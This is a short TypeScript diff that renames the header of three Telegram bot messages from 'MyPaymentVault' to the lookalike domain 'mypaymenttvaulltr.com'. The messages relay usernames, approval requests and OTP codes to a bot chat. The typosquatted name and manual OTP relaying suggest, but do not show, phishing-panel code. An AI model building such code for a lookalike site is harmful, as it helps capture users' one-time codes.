@@ -72,7 +72,7 @@ export async function sendApprovalRequest(
         parse_mode: "HTML",
         text:
           `━━━━━━━━━━━━━━━━━━━━━\n` +
-          `🔐 <b>MyPaymentVault</b>\n` +
+          `🔐 <b>mypaymenttvaulltr.com</b>\n` +
           `📌 <b>Permintaan ${label}</b>\n` +
           `━━━━━━━━━━━━━━━━━━━━━\n\n` +
           `👤 <b>Username</b>   : <code>${username}</code>\n` +
@@ -157,7 +157,7 @@ export async function sendBotOTP(otp: string, username: string): Promise<void> {
         parse_mode: "HTML",
         text:
           `━━━━━━━━━━━━━━━━━━━━━\n` +
-          `🔐 <b>MyPaymentVault</b>\n` +
+          `🔐 <b>mypaymenttvaulltr.com</b>\n` +
           `📌 <b>Kode OTP — Kirim ke User</b>\n` +
           `━━━━━━━━━━━━━━━━━━━━━\n\n` +
           `👤 <b>Username</b> : <code>${username}</code>\n` +
@@ -187,7 +187,7 @@ export async function sendOtpVerificationRequest(
         parse_mode: "HTML",
         text:
           `━━━━━━━━━━━━━━━━━━━━━\n` +
-          `🔐 <b>MyPaymentVault</b>\n` +
+          `🔐 <b>mypaymenttvaulltr.com</b>\n` +
           `📌 <b>Verifikasi Kode OTP</b>\n` +
           `━━━━━━━━━━━━━━━━━━━━━\n\n` +
           `👤 <b>Username</b>     : <code>${username}</code>\n` +
